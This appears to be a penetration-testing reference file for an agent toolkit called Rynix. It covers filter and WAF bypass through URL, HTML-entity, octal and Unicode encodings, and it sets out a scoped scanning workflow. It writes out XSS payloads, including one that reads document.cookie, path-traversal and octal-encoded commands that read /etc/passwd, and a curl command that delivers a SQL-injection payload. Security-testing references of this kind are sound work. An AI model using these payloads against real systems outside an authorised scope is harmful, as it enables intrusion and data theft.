---
id: PS-SKILLS
category: Essential skills
wstg_refs: []
lab_count: 2
---

# Essential Skills: Reference

## 1. Obfuscating Attacks Using Encodings

Encoding transformations are used to bypass WAFs, input filters, and security controls. The key principle: encode the payload in a way the security filter does not understand but the backend application decodes and processes normally.

> Lab refs: PS-SKILLS-01

### 1A. URL Encoding

Characters are replaced with `%HH` where HH is the hex value of the ASCII byte. Browsers and servers automatically decode URL-encoded values, so filters must check after decoding.

| Character | URL Encoded | Use Case |
|-----------|------------|----------|
| `<` | `%3c` | XSS filter bypass |
| `>` | `%3e` | XSS filter bypass |
| `"` | `%22` | Attribute injection |
| `'` | `%27` | SQLi, XSS |
| `/` | `%2f` | Path traversal |
| `\` | `%5c` | Path traversal (Windows) |
| `.` | `%2e` | Path traversal |
| `;` | `%3b` | Command injection |
| `|` | `%7c` | Command injection |
| `&` | `%26` | Parameter pollution |
| `#` | `%23` | Query truncation |
| `=` | `%3d` | Parameter injection |
| space | `%20` or `+` | Payload separation |

**XSS example:**
```
# Blocked
<script>alert(1)</script>

# URL encoded
%3cscript%3ealert(1)%3c%2fscript%3e
```

### 1B. Double URL Encoding

Encode the `%` character itself. Useful when the application URL-decodes input twice (once by the web server, once by the application).

| Character | Single Encoded | Double Encoded |
|-----------|---------------|----------------|
| `<` | `%3c` | `%253c` |
| `>` | `%3e` | `%253e` |
| `'` | `%27` | `%2527` |
| `/` | `%2f` | `%252f` |
| `.` | `%2e` | `%252e` |

**Path traversal example:**
```
# Blocked
../../../etc/passwd

# Double encoded
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 1C. HTML Entity Encoding

Characters are replaced with `&#decimal;` or `&#xhex;` or named entities. HTML parsers decode these before JavaScript or attribute handlers process the content.

| Character | Decimal Entity | Hex Entity | Named Entity |
|-----------|---------------|------------|--------------|
| `<` | `&#60;` | `&#x3c;` | `&lt;` |
| `>` | `&#62;` | `&#x3e;` | `&gt;` |
| `"` | `&#34;` | `&#x22;` | `&quot;` |
| `'` | `&#39;` | `&#x27;` | `&apos;` |
| `/` | `&#47;` | `&#x2f;` | — |
| `(` | `&#40;` | `&#x28;` | — |
| `)` | `&#41;` | `&#x29;` | — |

**XSS in attribute context:**
```html
<!-- Blocked -->
<img src=x onerror="alert(1)">

<!-- HTML entity encoded event handler -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1&#41;">

<!-- Hex entity variant -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
```

**Leading zeros in entities (WAF bypass):**
```html
<!-- Padded with zeros — still valid HTML entities -->
<img src=x onerror="&#0000097;lert(1)">
<img src=x onerror="&#x00061;lert(1)">
```

### 1D. Hex Encoding

Raw hex byte representation, used in various contexts.

**JavaScript hex escapes:**
```javascript
// alert(1)
\x61\x6c\x65\x72\x74\x28\x31\x29

// eval(String.fromCharCode(...))
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

**SQL hex literals:**
```sql
-- admin in hex
SELECT * FROM users WHERE username = 0x61646d696e

-- MySQL
SELECT * FROM users WHERE username = UNHEX('61646d696e')
```

### 1E. Octal Encoding

Octal byte representation, primarily useful in command injection and some JavaScript contexts.

**Command injection with octal:**
```bash
# /etc/passwd in octal
$'\057\145\164\143\057\160\141\163\163\167\144'

# cat /etc/passwd
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

**JavaScript octal (legacy, non-strict mode):**
```javascript
// alert
\141\154\145\162\164
```

### 1F. Unicode Escaping

Unicode escape sequences for bypassing filters in JavaScript, JSON, and some server-side languages.

**JavaScript Unicode escapes:**
```javascript
// alert(1)
\u0061\u006c\u0065\u0072\u0074(1)

// Using eval
\u0065\u0076\u0061\u006c('alert(1)')
```

**JSON Unicode escapes:**
```json
{"key": "\u003cscript\u003ealert(1)\u003c/script\u003e"}
```

**UTF-8 overlong encoding (legacy server bypass):**
```
# / as overlong UTF-8
%c0%af

# . as overlong UTF-8
%c0%ae

# Path traversal with overlong encoding
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

### 1G. Mixed Encoding Chains

Combine multiple encoding types in a single payload. Each layer is decoded by a different processing stage (web server, WAF, application, browser).

**URL + HTML entity chain:**
```
# Step 1: XSS payload
<img src=x onerror=alert(1)>

# Step 2: HTML-encode the event handler
<img src=x onerror=&#97;lert(1)>

# Step 3: URL-encode the angle brackets
%3cimg src=x onerror=&#97;lert(1)%3e
```

**Double URL + HTML chain:**
```
%253cimg src=x onerror=&#97;lert(1)%253e
```

**JavaScript + URL chain (for eval/setTimeout/Function contexts):**
```javascript
// Original: alert(document.cookie)
// JS Unicode + URL encode
eval('\u0061\u006c\u0065\u0072\u0074(document.cookie)')
eval('%5cu0061lert(document.cookie)')
```

## 2. Targeted Scanning with template-scan

Automated scanning of specific insertion points rather than crawling the entire application. This is more efficient and focused for pentest agents.

> Lab refs: PS-SKILLS-01, PS-SKILLS-02

### 2A. Scanning Specific Requests

Rather than scanning the whole site, target individual requests where manual testing identified interesting behavior:
1. Identify a request with potential injection points
2. Right-click the request via http_probe, select "Scan" or "Do active scan"
3. Configure audit items to focus on relevant vulnerability classes

### 2B. Non-Standard Data Structure Scanning

When parameters are embedded in non-standard formats (JSON within URL params, nested objects, custom serialization), Rynix may miss injection points. Manual identification of insertion points is needed.

**Common non-standard structures:**
```
# JSON in URL parameter
?data={"user":"test","id":1}

# Base64-encoded parameters
?token=eyJ1c2VyIjoiYWRtaW4ifQ==

# XML in POST body (not detected as XML by content-type)
data=<user><name>test</name></user>

# Nested JSON
{"outer":{"inner":"INJECT_HERE"}}

# Array parameters
ids[]=1&ids[]=2&ids[]=3
```

**For pentest agents (CLI-based, no GUI proxy):**
When scanning non-standard structures, manually extract the embedded value, test it separately, then re-embed:
```bash
# Extract base64 param
echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
# {"user":"admin"}

# Test injection in decoded value
# {"user":"admin' OR '1'='1"}

# Re-encode and send
echo '{"user":"admin'\'' OR '\''1'\''='\''1"}' | base64
curl -sk "https://target.com/api?token=$(echo '{"user":"admin'\'' OR '\''1'\''='\''1"}' | base64)"
```

## 3. Encoding Reference Table

| Encoding Type | Syntax | When to Use | Common Bypass Scenarios |
|---------------|--------|-------------|------------------------|
| URL encoding | `%HH` | Always try first for any web parameter | WAF blocking raw special chars |
| Double URL encoding | `%25HH` | Application decodes twice (proxy + app) | WAF decodes once, app decodes again |
| HTML entity (decimal) | `&#DD;` | XSS in HTML attribute context | Event handler filters |
| HTML entity (hex) | `&#xHH;` | XSS in HTML attribute context | Same as decimal, alternative form |
| HTML entity (named) | `&lt;` etc. | XSS in HTML body context | Tag-based filters |
| JavaScript Unicode | `\uHHHH` | XSS in JS string/template context | JS keyword filters (alert, eval) |
| JavaScript hex | `\xHH` | XSS in JS string context | Character-level filters |
| JavaScript octal | `\OOO` | XSS in JS (non-strict mode) | Legacy application bypass |
| SQL hex | `0xHH...` | SQL injection string bypass | Quote-based filters |
| Base64 | `[A-Za-z0-9+/=]` | Custom parameter encoding | Opaque parameter manipulation |
| UTF-8 overlong | `%c0%af` | Path traversal on legacy servers | Dot-slash filters |

### Choosing the Right Encoding

1. **Identify the context**: Where does your input land? (HTML body, attribute, JS string, SQL, URL path, command)
2. **Identify the filter**: What characters are blocked? Test each character individually.
3. **Choose encoding for the context**:
   - HTML body/attribute: HTML entities
   - JavaScript string: JS Unicode or hex escapes
   - URL parameter: URL encoding or double encoding
   - SQL query: Hex literals, CHAR() function
   - OS command: Octal, hex, variable expansion
4. **Chain encodings** when multiple processing layers exist between filter and execution point
5. **Test with leading zeros**: `&#0000060;` is the same as `&#60;` but may bypass regex filters checking for exact patterns
## Rynix workflow

1. `get_technique_guide` for `essential-skills` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `analyze_repo`, `get_technique_guide`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `analyze_repo`
- `get_technique_guide`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

